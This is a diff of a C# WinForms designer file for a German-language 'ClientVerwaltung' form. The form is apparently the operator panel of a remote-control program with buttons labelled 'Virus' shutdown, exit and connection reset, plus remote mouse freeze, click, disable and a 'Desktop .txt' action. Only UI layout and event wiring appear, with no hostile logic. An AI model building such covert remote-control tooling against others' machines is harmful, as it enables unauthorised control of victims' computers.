@@ -34,6 +34,12 @@
             this.label1 = new System.Windows.Forms.Label();
             this.monoFlat_HeaderLabel1 = new MonoFlat.Class1.MonoFlat_HeaderLabel();
             this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
+            this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
+            this.Button_Maus_Simulate = new MonoFlat.Class1.MonoFlat_Button();
+            this.Button_Maus_Disable = new MonoFlat.Class1.MonoFlat_Button();
+            this.Button_Maus_DoubleKlick = new MonoFlat.Class1.MonoFlat_Button();
+            this.Button_Maus_Klick = new MonoFlat.Class1.MonoFlat_Button();
+            this.Button_Maus_Freeze = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabPage3 = new MetroFramework.Controls.MetroTabPage();
             this.panel1 = new System.Windows.Forms.Panel();
             this.richTextBoxSendText = new System.Windows.Forms.RichTextBox();
@@ -53,23 +59,19 @@
             this.Button_VirusConnectionReset = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusShutdown = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusExit = new MonoFlat.Class1.MonoFlat_Button();
-            this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
-            this.Button_Maus_Simulate = new MonoFlat.Class1.MonoFlat_Button();
-            this.Button_Maus_Disable = new MonoFlat.Class1.MonoFlat_Button();
-            this.Button_Maus_DoubleKlick = new MonoFlat.Class1.MonoFlat_Button();
-            this.Button_Maus_Klick = new MonoFlat.Class1.MonoFlat_Button();
-            this.Button_Maus_Freeze = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
             this.bunifuCheckbox1 = new Bunifu.Framework.UI.BunifuCheckbox();
             this.bunifuCustomLabel1 = new Bunifu.Framework.UI.BunifuCustomLabel();
             this.timerSendMousePosition = new System.Windows.Forms.Timer(this.components);
             this.MessageCheckTimer = new System.Windows.Forms.Timer(this.components);
             this.bunifuFlatButtonSend = new Bunifu.Framework.UI.BunifuFlatButton();
+            this.monoFlat_ButtonDektopTXT = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabControl1.SuspendLayout();
+            this.metroTabPage2.SuspendLayout();
             this.metroTabPage3.SuspendLayout();
             this.panel1.SuspendLayout();
             this.metroTabPage1.SuspendLayout();
-            this.metroTabPage2.SuspendLayout();
+            this.metroTabPage4.SuspendLayout();
             this.SuspendLayout();
             // 
             // TextBox_Commands
@@ -124,7 +126,7 @@
             this.metroTabControl1.FontWeight = MetroFramework.MetroTabControlWeight.Light;
             this.metroTabControl1.Location = new System.Drawing.Point(-3, 239);
             this.metroTabControl1.Name = "metroTabControl1";
-            this.metroTabControl1.SelectedIndex = 0;
+            this.metroTabControl1.SelectedIndex = 3;
             this.metroTabControl1.Size = new System.Drawing.Size(481, 333);
             this.metroTabControl1.Style = MetroFramework.MetroColorStyle.Blue;
             this.metroTabControl1.StyleManager = null;
@@ -132,6 +134,101 @@
             this.metroTabControl1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
             this.metroTabControl1.Theme = MetroFramework.MetroThemeStyle.Light;
             this.metroTabControl1.UseStyleColors = false;
+            // 
+            // metroTabPage2
+            // 
+            this.metroTabPage2.Controls.Add(this.Button_Maus_Simulate);
+            this.metroTabPage2.Controls.Add(this.Button_Maus_Disable);
+            this.metroTabPage2.Controls.Add(this.Button_Maus_DoubleKlick);
+            this.metroTabPage2.Controls.Add(this.Button_Maus_Klick);
+            this.metroTabPage2.Controls.Add(this.Button_Maus_Freeze);
+            this.metroTabPage2.CustomBackground = false;
+            this.metroTabPage2.HorizontalScrollbar = false;
+            this.metroTabPage2.HorizontalScrollbarBarColor = true;
+            this.metroTabPage2.HorizontalScrollbarHighlightOnWheel = false;
+            this.metroTabPage2.HorizontalScrollbarSize = 10;
+            this.metroTabPage2.Location = new System.Drawing.Point(4, 35);
+            this.metroTabPage2.Name = "metroTabPage2";
+            this.metroTabPage2.Size = new System.Drawing.Size(473, 294);
+            this.metroTabPage2.Style = MetroFramework.MetroColorStyle.Blue;
+            this.metroTabPage2.StyleManager = null;
+            this.metroTabPage2.TabIndex = 1;
+            this.metroTabPage2.Text = "Maus-Steuerung";
+            this.metroTabPage2.Theme = MetroFramework.MetroThemeStyle.Light;
+            this.metroTabPage2.VerticalScrollbar = false;
+            this.metroTabPage2.VerticalScrollbarBarColor = true;
+            this.metroTabPage2.VerticalScrollbarHighlightOnWheel = false;
+            this.metroTabPage2.VerticalScrollbarSize = 10;
+            // 
+            // Button_Maus_Simulate
+            // 
+            this.Button_Maus_Simulate.BackColor = System.Drawing.Color.Transparent;
+            this.Button_Maus_Simulate.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.Button_Maus_Simulate.Image = null;
+            this.Button_Maus_Simulate.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.Button_Maus_Simulate.Location = new System.Drawing.Point(11, 206);
+            this.Button_Maus_Simulate.Name = "Button_Maus_Simulate";
+            this.Button_Maus_Simulate.Size = new System.Drawing.Size(150, 40);
+            this.Button_Maus_Simulate.TabIndex = 6;
+            this.Button_Maus_Simulate.Text = "Mausposition übertragen";
+            this.Button_Maus_Simulate.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.Button_Maus_Simulate.Click += new System.EventHandler(this.Button_Maus_Simulate_Click);
+            // 
+            // Button_Maus_Disable
+            // 
+            this.Button_Maus_Disable.BackColor = System.Drawing.Color.Transparent;
+            this.Button_Maus_Disable.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.Button_Maus_Disable.Image = null;
+            this.Button_Maus_Disable.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.Button_Maus_Disable.Location = new System.Drawing.Point(11, 159);
+            this.Button_Maus_Disable.Name = "Button_Maus_Disable";
+            this.Button_Maus_Disable.Size = new System.Drawing.Size(150, 40);
+            this.Button_Maus_Disable.TabIndex = 5;
+            this.Button_Maus_Disable.Text = "Deaktivieren";
+            this.Button_Maus_Disable.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.Button_Maus_Disable.Click += new System.EventHandler(this.Button_Maus_Disable_Click);
+            // 
+            // Button_Maus_DoubleKlick
+            // 
+            this.Button_Maus_DoubleKlick.BackColor = System.Drawing.Color.Transparent;
+            this.Button_Maus_DoubleKlick.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.Button_Maus_DoubleKlick.Image = null;
+            this.Button_Maus_DoubleKlick.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.Button_Maus_DoubleKlick.Location = new System.Drawing.Point(11, 112);
+            this.Button_Maus_DoubleKlick.Name = "Button_Maus_DoubleKlick";
+            this.Button_Maus_DoubleKlick.Size = new System.Drawing.Size(150, 40);
+            this.Button_Maus_DoubleKlick.TabIndex = 4;
+            this.Button_Maus_DoubleKlick.Text = "Doppelklick";
+            this.Button_Maus_DoubleKlick.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.Button_Maus_DoubleKlick.Click += new System.EventHandler(this.Button_Maus_DoubleKlick_Click);
+            // 
+            // Button_Maus_Klick
+            // 
+            this.Button_Maus_Klick.BackColor = System.Drawing.Color.Transparent;
+            this.Button_Maus_Klick.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.Button_Maus_Klick.Image = null;
+            this.Button_Maus_Klick.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.Button_Maus_Klick.Location = new System.Drawing.Point(11, 65);
+            this.Button_Maus_Klick.Name = "Button_Maus_Klick";
+            this.Button_Maus_Klick.Size = new System.Drawing.Size(150, 40);
+            this.Button_Maus_Klick.TabIndex = 3;
+            this.Button_Maus_Klick.Text = "Klick";
+            this.Button_Maus_Klick.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.Button_Maus_Klick.Click += new System.EventHandler(this.Button_Maus_Klick_Click);
+            // 
+            // Button_Maus_Freeze
+            // 
+            this.Button_Maus_Freeze.BackColor = System.Drawing.Color.Transparent;
+            this.Button_Maus_Freeze.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.Button_Maus_Freeze.Image = null;
+            this.Button_Maus_Freeze.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.Button_Maus_Freeze.Location = new System.Drawing.Point(11, 18);
+            this.Button_Maus_Freeze.Name = "Button_Maus_Freeze";
+            this.Button_Maus_Freeze.Size = new System.Drawing.Size(150, 40);
+            this.Button_Maus_Freeze.TabIndex = 2;
+            this.Button_Maus_Freeze.Text = "Maus-Freeze";
+            this.Button_Maus_Freeze.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.Button_Maus_Freeze.Click += new System.EventHandler(this.Button_Maus_Freeze_Click);
             // 
             // metroTabPage3
             // 
@@ -419,103 +516,9 @@
             this.Button_VirusExit.TextAlignment = System.Drawing.StringAlignment.Center;
             this.Button_VirusExit.Click += new System.EventHandler(this.Button_VirusExit_Click);
             // 
-            // metroTabPage2
-            // 
-            this.metroTabPage2.Controls.Add(this.Button_Maus_Simulate);
-            this.metroTabPage2.Controls.Add(this.Button_Maus_Disable);
-            this.metroTabPage2.Controls.Add(this.Button_Maus_DoubleKlick);
-            this.metroTabPage2.Controls.Add(this.Button_Maus_Klick);
-            this.metroTabPage2.Controls.Add(this.Button_Maus_Freeze);
-            this.metroTabPage2.CustomBackground = false;
-            this.metroTabPage2.HorizontalScrollbar = false;
-            this.metroTabPage2.HorizontalScrollbarBarColor = true;
-            this.metroTabPage2.HorizontalScrollbarHighlightOnWheel = false;
-            this.metroTabPage2.HorizontalScrollbarSize = 10;
-            this.metroTabPage2.Location = new System.Drawing.Point(4, 35);
-            this.metroTabPage2.Name = "metroTabPage2";
-            this.metroTabPage2.Size = new System.Drawing.Size(473, 294);
-            this.metroTabPage2.Style = MetroFramework.MetroColorStyle.Blue;
-            this.metroTabPage2.StyleManager = null;
-            this.metroTabPage2.TabIndex = 1;
-            this.metroTabPage2.Text = "Maus-Steuerung";
-            this.metroTabPage2.Theme = MetroFramework.MetroThemeStyle.Light;
-            this.metroTabPage2.VerticalScrollbar = false;
-            this.metroTabPage2.VerticalScrollbarBarColor = true;
-            this.metroTabPage2.VerticalScrollbarHighlightOnWheel = false;
-            this.metroTabPage2.VerticalScrollbarSize = 10;
-            // 
-            // Button_Maus_Simulate
-            // 
-            this.Button_Maus_Simulate.BackColor = System.Drawing.Color.Transparent;
-            this.Button_Maus_Simulate.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.Button_Maus_Simulate.Image = null;
-            this.Button_Maus_Simulate.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.Button_Maus_Simulate.Location = new System.Drawing.Point(11, 206);
-            this.Button_Maus_Simulate.Name = "Button_Maus_Simulate";
-            this.Button_Maus_Simulate.Size = new System.Drawing.Size(150, 40);
-            this.Button_Maus_Simulate.TabIndex = 6;
-            this.Button_Maus_Simulate.Text = "Mausposition übertragen";
-            this.Button_Maus_Simulate.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.Button_Maus_Simulate.Click += new System.EventHandler(this.Button_Maus_Simulate_Click);
-            // 
-            // Button_Maus_Disable
-            // 
-            this.Button_Maus_Disable.BackColor = System.Drawing.Color.Transparent;
-            this.Button_Maus_Disable.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.Button_Maus_Disable.Image = null;
-            this.Button_Maus_Disable.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.Button_Maus_Disable.Location = new System.Drawing.Point(11, 159);
-            this.Button_Maus_Disable.Name = "Button_Maus_Disable";
-            this.Button_Maus_Disable.Size = new System.Drawing.Size(150, 40);
-            this.Button_Maus_Disable.TabIndex = 5;
-            this.Button_Maus_Disable.Text = "Deaktivieren";
-            this.Button_Maus_Disable.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.Button_Maus_Disable.Click += new System.EventHandler(this.Button_Maus_Disable_Click);
-            // 
-            // Button_Maus_DoubleKlick
-            // 
-            this.Button_Maus_DoubleKlick.BackColor = System.Drawing.Color.Transparent;
-            this.Button_Maus_DoubleKlick.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.Button_Maus_DoubleKlick.Image = null;
-            this.Button_Maus_DoubleKlick.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.Button_Maus_DoubleKlick.Location = new System.Drawing.Point(11, 112);
-            this.Button_Maus_DoubleKlick.Name = "Button_Maus_DoubleKlick";
-            this.Button_Maus_DoubleKlick.Size = new System.Drawing.Size(150, 40);
-            this.Button_Maus_DoubleKlick.TabIndex = 4;
-            this.Button_Maus_DoubleKlick.Text = "Doppelklick";
-            this.Button_Maus_DoubleKlick.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.Button_Maus_DoubleKlick.Click += new System.EventHandler(this.Button_Maus_DoubleKlick_Click);
-            // 
-            // Button_Maus_Klick
-            // 
-            this.Button_Maus_Klick.BackColor = System.Drawing.Color.Transparent;
-            this.Button_Maus_Klick.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.Button_Maus_Klick.Image = null;
-            this.Button_Maus_Klick.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.Button_Maus_Klick.Location = new System.Drawing.Point(11, 65);
-            this.Button_Maus_Klick.Name = "Button_Maus_Klick";
-            this.Button_Maus_Klick.Size = new System.Drawing.Size(150, 40);
-            this.Button_Maus_Klick.TabIndex = 3;
-            this.Button_Maus_Klick.Text = "Klick";
-            this.Button_Maus_Klick.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.Button_Maus_Klick.Click += new System.EventHandler(this.Button_Maus_Klick_Click);
-            // 
-            // Button_Maus_Freeze
-            // 
-            this.Button_Maus_Freeze.BackColor = System.Drawing.Color.Transparent;
-            this.Button_Maus_Freeze.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.Button_Maus_Freeze.Image = null;
-            this.Button_Maus_Freeze.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.Button_Maus_Freeze.Location = new System.Drawing.Point(11, 18);
-            this.Button_Maus_Freeze.Name = "Button_Maus_Freeze";
-            this.Button_Maus_Freeze.Size = new System.Drawing.Size(150, 40);
-            this.Button_Maus_Freeze.TabIndex = 2;
-            this.Button_Maus_Freeze.Text = "Maus-Freeze";
-            this.Button_Maus_Freeze.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.Button_Maus_Freeze.Click += new System.EventHandler(this.Button_Maus_Freeze_Click);
-            // 
             // metroTabPage4
             // 
+            this.metroTabPage4.Controls.Add(this.monoFlat_ButtonDektopTXT);
             this.metroTabPage4.CustomBackground = false;
             this.metroTabPage4.HorizontalScrollbar = false;
             this.metroTabPage4.HorizontalScrollbarBarColor = true;
@@ -601,6 +604,20 @@
             this.bunifuFlatButtonSend.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.bunifuFlatButtonSend.Click += new System.EventHandler(this.bunifuFlatButtonSend_Click);
             // 
+            // monoFlat_ButtonDektopTXT
+            // 
+            this.monoFlat_ButtonDektopTXT.BackColor = System.Drawing.Color.Transparent;
+            this.monoFlat_ButtonDektopTXT.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.monoFlat_ButtonDektopTXT.Image = null;
+            this.monoFlat_ButtonDektopTXT.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.monoFlat_ButtonDektopTXT.Location = new System.Drawing.Point(12, 12);
+            this.monoFlat_ButtonDektopTXT.Name = "monoFlat_ButtonDektopTXT";
+            this.monoFlat_ButtonDektopTXT.Size = new System.Drawing.Size(150, 40);
+            this.monoFlat_ButtonDektopTXT.TabIndex = 3;
+            this.monoFlat_ButtonDektopTXT.Text = "Desktop .txt";
+            this.monoFlat_ButtonDektopTXT.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.monoFlat_ButtonDektopTXT.Click += new System.EventHandler(this.monoFlat_ButtonDektopTXT_Click);
+            // 
             // ClientVerwaltung
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -619,10 +636,11 @@
             this.TransparencyKey = System.Drawing.Color.Fuchsia;
             this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.ClientVerwaltung_FormClosed);
             this.metroTabControl1.ResumeLayout(false);
+            this.metroTabPage2.ResumeLayout(false);
             this.metroTabPage3.ResumeLayout(false);
             this.panel1.ResumeLayout(false);
             this.metroTabPage1.ResumeLayout(false);
-            this.metroTabPage2.ResumeLayout(false);
+            this.metroTabPage4.ResumeLayout(false);
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -664,5 +682,6 @@
         private System.Windows.Forms.Timer MessageCheckTimer;
         private System.Windows.Forms.Panel panel1;
         private System.Windows.Forms.RichTextBox richTextBoxSendText;
+        private MonoFlat.Class1.MonoFlat_Button monoFlat_ButtonDektopTXT;
     }
 }
